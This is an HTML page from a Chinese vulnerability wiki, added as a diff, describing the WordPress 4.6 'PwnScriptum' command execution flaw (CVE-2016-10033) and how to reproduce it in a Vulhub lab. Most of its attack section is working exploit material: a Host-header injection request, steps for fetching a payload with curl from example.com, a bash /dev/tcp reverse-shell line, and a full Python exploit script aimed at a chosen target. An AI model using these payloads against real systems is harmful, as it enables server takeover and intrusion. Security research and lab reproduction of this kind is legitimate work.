@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/CMS%E6%BC%8F%E6%B4%9E/Wordpress%204.6%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20PwnScriptum/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Wordpress 4.6 任意命令执行漏洞 PwnScriptum - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Wordpress 4.6 \u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e PwnScriptum", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+              {title: "\u6f0f\u6d1ePOC", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../YzmCMS%20Version%20%E5%B0%8F%E4%BA%8EV5.8%E6%AD%A3%E5%BC%8F%E7%89%88%20%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97%20SSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../YzmCMS%20Version%20%E5%B0%8F%E4%BA%8EV5.8%E6%AD%A3%E5%BC%8F%E7%89%88%20%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97%20SSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        YzmCMS Version 小于V5.8正式版 后台采集模块 SSRF漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../WordPress%20WP_Query%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2022-21661/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../WordPress%20WP_Query%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2022-21661/" class="btn btn-xs btn-link">
+        WordPress WP_Query SQL 注入漏洞 CVE-2022-21661
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="wordpress-46-pwnscriptum">Wordpress 4.6 任意命令执行漏洞 PwnScriptum<a class="headerlink" href="#wordpress-46-pwnscriptum" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>参考：
+- <a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html">https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</a></p>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Vulhub编译及运行测试环境</p>
+<div class="highlight"><pre><span></span><code>docker-compose build
+docker-compose up -d
+</code></pre></div>
+<p>由于Mysql初始化需要一段时间，所以请等待。成功运行后，访问<code>http://your-ip:8080/wp-admin/install.php</code>打开站点，初始化管理员用户名和密码后即可使用（数据库等已经配置好，且不会自动更新）。</p>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>发送如下数据包，可见<code>/tmp/awesome_poc</code>已经成功创建：</p>
+<div class="highlight"><pre><span></span><code>POST /wp-login.php?action=lostpassword HTTP/1.1
+Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}awesome_poc}} null)
+Connection: close
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Accept: */*
+Content-Length: 56
+Content-Type: application/x-www-form-urlencoded
+
+wp-submit=Get+New+Password&amp;redirect_to=&amp;user_login=admin
+</code></pre></div>
+<p><img alt="image-20220302225431160" src="../images/202203022254237.png" /></p>
+<p><img alt="image-20220302225419095" src="../images/202203022254142.png" /></p>
+<p>但实际利用起来，还是有一些坑需要踏过。具体的坑有这么几个：</p>
+<ol>
+<li>执行的命令不能包含大量特殊字符，如<code>:</code>、引号等。</li>
+<li>命令会被转换成小写字母</li>
+<li>命令需要使用绝对路径</li>
+<li>需要知道某一个存在的用户的用户名</li>
+</ol>
+<p>为了解决这些坑，漏洞作者想出了，利用<code>${substr{0}{1}{$spool_directory}}</code>代替<code>/</code>，用<code>${substr{10}{1}{$tod_log}}</code>代替空格的方法。</p>
+<p>但是还是有很多字符不能用，所以我们需要将待执行的命令放到第三方网站中，然后通过<code>curl -o /tmp/rce example.com/shell.sh</code>的方法先将他下载到/tmp目录中，再去执行。</p>
+<p>所以，总体来说利用过程如下：</p>
+<ul>
+<li>编写反弹shell的exp，放到某个网页里。有如下要求：</li>
+<li>整个url的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径</li>
+<li>访问该网页不能跳转，因为follow跳转的参数是<code>-L</code>（大写）</li>
+<li>拼接成命令<code>/usr/bin/curl -o/tmp/rce example.com/shell.sh</code>和命令<code>/bin/bash /tmp/rce</code></li>
+<li>将上述命令中的空格和<code>/</code>转换成<code>${substr{10}{1}{$tod_log}}</code>和<code>${substr{0}{1}{$spool_directory}}</code></li>
+<li>拼接成HTTP包的Host头：<code>target(any -froot@localhost -be ${run{command}} null)</code></li>
+<li>依次发送这两个拼接好的数据包</li>
+</ul>
+<p>将上述过程写成<a href="https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/exploit.py">exp脚本</a>，将脚本中target修改成你的目标，user修改成一个已经存在的用户，<code>shell_url</code>修改成你放置payload的网址。（或直接将target作为第一个参数、<code>shell_url</code>作为第二个参数）</p>
+<blockquote>
+<p>example.com/shell.sh的内容为：</p>
+<div class="highlight"><pre><span></span><code>bash -i &gt;&amp; /dev/tcp/your-reverse—shell-ip/9999 0&gt;&amp;1
+</code></pre></div>
+</blockquote>
+<p>执行即可获得shell：</p>
+<div class="highlight"><pre><span></span><code>python wordpress.py http://192.168.174.128:8080 example.com/shell.sh
+</code></pre></div>
+<p>监听9999端口，接收反弹shell：</p>
+<p><img alt="image-20220302225928420" src="../images/202203022259514.png" /></p>
+<h2 id="poc">漏洞POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="c1"># wordpress&#39;s url</span>
+<span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="c1"># Put your command in a website, and use the website&#39;s url</span>
+<span class="c1"># don&#39;t contains &quot;http://&quot;, must be all lowercase</span>
+<span class="n">shell_url</span> <span class="o">=</span> <span class="s1">&#39;example.com/1.txt&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="c1"># an exists user</span>
+<span class="n">user</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">generate_command</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;${run{</span><span class="si">%s</span><span class="s1">}}&#39;</span> <span class="o">%</span> <span class="n">command</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;${substr</span><span class="si">{0}{1}</span><span class="s1">{$spool_directory}}&#39;</span><span class="p">)</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;${substr</span><span class="si">{10}{1}</span><span class="s1">{$tod_log}}&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s1">&#39;target(any -froot@localhost -be </span><span class="si">%s</span><span class="s1"> null)&#39;</span> <span class="o">%</span> <span class="n">command</span>
+
+
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;user_login&#39;</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span>
+    <span class="s1">&#39;redirect_to&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;wp-submit&#39;</span><span class="p">:</span> <span class="s1">&#39;Get New Password&#39;</span>
+<span class="p">}</span>
+<span class="n">session</span><span class="o">.</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;Host&#39;</span><span class="p">:</span> <span class="n">generate_command</span><span class="p">(</span><span class="s1">&#39;/usr/bin/curl -o/tmp/rce &#39;</span> <span class="o">+</span> <span class="n">shell_url</span><span class="p">),</span>
+    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#39;</span>
+<span class="p">}</span>
+<span class="n">session</span><span class="o">.</span><span class="n">allow_redirects</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">target</span> <span class="o">+=</span> <span class="s1">&#39;/wp-login.php?action=lostpassword&#39;</span>
+<span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+<span class="n">session</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Host&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">generate_command</span><span class="p">(</span><span class="s1">&#39;/bin/bash /tmp/rce&#39;</span><span class="p">)</span>
+<span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../YzmCMS%20Version%20%E5%B0%8F%E4%BA%8EV5.8%E6%AD%A3%E5%BC%8F%E7%89%88%20%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97%20SSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../YzmCMS%20Version%20%E5%B0%8F%E4%BA%8EV5.8%E6%AD%A3%E5%BC%8F%E7%89%88%20%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97%20SSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        YzmCMS Version 小于V5.8正式版 后台采集模块 SSRF漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../WordPress%20WP_Query%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2022-21661/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../WordPress%20WP_Query%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2022-21661/" class="btn btn-xs btn-link">
+        WordPress WP_Query SQL 注入漏洞 CVE-2022-21661
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
